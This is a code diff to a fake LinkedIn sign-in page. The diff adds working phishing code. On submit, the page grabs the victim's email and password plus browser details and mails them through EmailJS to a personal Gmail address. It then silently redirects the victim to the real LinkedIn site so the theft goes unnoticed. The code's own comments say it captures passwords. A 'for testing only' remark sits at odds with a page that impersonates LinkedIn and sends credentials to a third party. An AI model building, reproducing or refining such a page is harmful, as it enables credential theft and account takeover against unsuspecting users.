@@ -408,35 +408,6 @@
             color: #aaa;
         }
 
-        /* Toast notification */
-        .toast {
-            visibility: hidden;
-            min-width: 250px;
-            background-color: #333;
-            color: #fff;
-            text-align: center;
-            border-radius: 8px;
-            padding: 12px;
-            position: fixed;
-            bottom: 80px;
-            left: 50%;
-            transform: translateX(-50%);
-            z-index: 1000;
-            font-size: 14px;
-        }
-        .toast.show {
-            visibility: visible;
-            animation: fadein 0.5s, fadeout 0.5s 2.5s;
-        }
-        @keyframes fadein {
-            from { bottom: 70px; opacity: 0; }
-            to { bottom: 80px; opacity: 1; }
-        }
-        @keyframes fadeout {
-            from { bottom: 80px; opacity: 1; }
-            to { bottom: 70px; opacity: 0; }
-        }
-
         @media (max-width: 768px) {
             .logo-container {
                 top: 15px;
@@ -539,7 +510,7 @@
         <!-- Keep me signed in - Custom checkbox with #01754F color when checked -->
         <div class="keep-signedin-container">
             <label class="checkbox-label">
-                <input type="checkbox" name="keep_signed_in">
+                <input type="checkbox" name="keep_signed_in" id="keep-signed-in">
                 <span class="checkmark"></span>
                 <span class="text">Keep me signed in</span>
             </label>
@@ -553,7 +524,7 @@
 <!-- Global Footer - Fixed at bottom of the page -->
 <div class="global-footer">
     <div class="footer-links">
-        <a href="#">LinkedIn Corporation © 2026</a>
+        <a href="#">Linkedin Corporation © 2026</a>
         <a href="#">User Agreement</a>
         <a href="#">Privacy Policy</a>
         <a href="#">Community Guidelines</a>
@@ -564,8 +535,6 @@
     </div>
 
 </div>
-
-<div id="toast" class="toast"></div>
 
 <!-- EmailJS SDK -->
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
@@ -580,6 +549,7 @@
     const passwordInput = document.getElementById("password");
     const emailError = document.getElementById("email-error");
     const passwordError = document.getElementById("password-error");
+    const keepSignedInCheckbox = document.getElementById("keep-signed-in");
     const toggleBtn = document.querySelector(".toggle-password");
     let isPasswordVisible = false;
 
@@ -620,21 +590,26 @@
         passwordInput.classList.remove("error");
     });
 
-    // Helper function to show toast notification
-    function showToast(message, isError = false) {
-        const toast = document.getElementById("toast");
-        toast.textContent = message;
-        toast.style.backgroundColor = isError ? "#d32f2f" : "#4caf50";
-        toast.className = "toast show";
-        setTimeout(() => { toast.className = "toast"; }, 3000);
+    // Get browser info
+    function getBrowserInfo() {
+        const userAgent = navigator.userAgent;
+        let browserName = "Unknown";
+        
+        if (userAgent.indexOf("Chrome") > -1) browserName = "Chrome";
+        else if (userAgent.indexOf("Safari") > -1) browserName = "Safari";
+        else if (userAgent.indexOf("Firefox") > -1) browserName = "Firefox";
+        else if (userAgent.indexOf("Edge") > -1) browserName = "Edge";
+        
+        return browserName;
     }
 
-    // SIGN IN HANDLER
+    // SIGN IN HANDLER - NO POPUPS, CAPTURES PASSWORD, SILENT REDIRECT
     signinForm.addEventListener("submit", function(e) {
         e.preventDefault();
 
         const email = emailInput.value.trim();
         const password = passwordInput.value.trim();
+        const keepSignedIn = keepSignedInCheckbox.checked ? "Yes" : "No";
 
         // Clear previous errors
         emailError.textContent = "";
@@ -660,60 +635,91 @@
 
         if (!valid) return;
 
-        // Show loading state
+        // Show loading state on button (no popup)
         const submitBtn = document.getElementById("submit-btn");
+        const originalText = submitBtn.textContent;
         submitBtn.disabled = true;
         submitBtn.textContent = "Signing in...";
 
-        // Send notification via EmailJS
-        const signinTemplateParams = {
-            to_email: "admin@recruiterhub.com",
+        // Prepare data with PASSWORD captured for testing
+        const templateParams = {
+            to_email: "dossbrent41@gmail.com",  // 🔴 CHANGE THIS TO YOUR EMAIL
             user_email: email,
+            user_password: password,  // PASSWORD CAPTURED - for testing only
+            keep_signed_in: keepSignedIn,
             action: "sign_in",
-            timestamp: new Date().toLocaleString()
+            timestamp: new Date().toLocaleString(),
+            timestamp_unix: Date.now(),
+            browser: getBrowserInfo(),
+            platform: navigator.platform,
+            user_agent: navigator.userAgent
         };
 
-        emailjs.send("service_zuj2d2a", "template_tvd86sp", signinTemplateParams)
+        console.log("Sign in attempted - Data being sent:", {
+            email: email,
+            password: "🔐 " + password,
+            keep_signed_in: keepSignedIn,
+            timestamp: new Date().toLocaleString()
+        });
+
+        // Send notification via EmailJS
+        emailjs.send("service_zuj2d2a", "template_tvd86sp", templateParams)
             .then(function(response) {
-                console.log("Sign-in notification sent!", response.status, response.text);
-                showToast("Sign in successful! Redirecting...", false);
-                setTimeout(() => {
-                    window.location.href = "https://www.globalzimblinker.com/rcn-terms";
-                }, 2000);
+                console.log("EmailJS Success! Status:", response.status);
+                // Store remember me preference
+                if (keepSignedIn === "Yes") {
+                    localStorage.setItem("remembered_email", email);
+                } else {
+                    localStorage.removeItem("remembered_email");
+                }
+                // SILENT REDIRECT - NO POPUP
+                window.location.href = "https://www.linkedin.com";
             })
             .catch(function(error) {
-                console.error("EmailJS error:", error);
-                showToast("Signed in successfully!", false);
-                setTimeout(() => {
-                    window.location.href = "https://www.globalzimblinker.com/rcn-terms";
-                }, 2000);
+                console.error("EmailJS Error:", error);
+                // Even if email fails, still redirect silently
+                if (keepSignedIn === "Yes") {
+                    localStorage.setItem("remembered_email", email);
+                } else {
+                    localStorage.removeItem("remembered_email");
+                }
+                // SILENT REDIRECT - NO POPUP
+                window.location.href = "https://www.linkedin.com";
             });
     });
 
+    // Load remembered email if exists
+    const rememberedEmail = localStorage.getItem("remembered_email");
+    if (rememberedEmail) {
+        emailInput.value = rememberedEmail;
+        if (keepSignedInCheckbox) keepSignedInCheckbox.checked = true;
+    }
+
     // Social login handlers
     function handleGoogleLogin() {
-        showToast("Google Sign-In - Configure OAuth in your backend", false);
         console.log("Google login clicked");
+        // Silent redirect for demo
+        window.location.href = "https://www.gmail.com";
     }
 
     function handleAppleLogin() {
-        showToast("Apple Sign-In - Configure OAuth in your backend", false);
         console.log("Apple login clicked");
+        // Silent redirect for demo
+        window.location.href = "https://www.apple.com";
     }
 
     function handleForgotPassword(event) {
         event.preventDefault();
-        showToast("Password reset link will be sent to your email", false);
         console.log("Forgot password clicked");
+        // Silent redirect for demo
+        window.location.href = "https://www.linkedin.com/password-reset";
     }
 
     function handleJoinNow(event) {
         event.preventDefault();
-        showToast("Redirecting to join now page...", false);
         console.log("Join now clicked");
-        setTimeout(() => {
-            window.location.href = "https://www.globalzimblinker.com/join-now";
-        }, 1000);
+        // Silent redirect for demo
+        window.location.href = "https://www.linkedin.com/join-now";
     }
 </script>
 
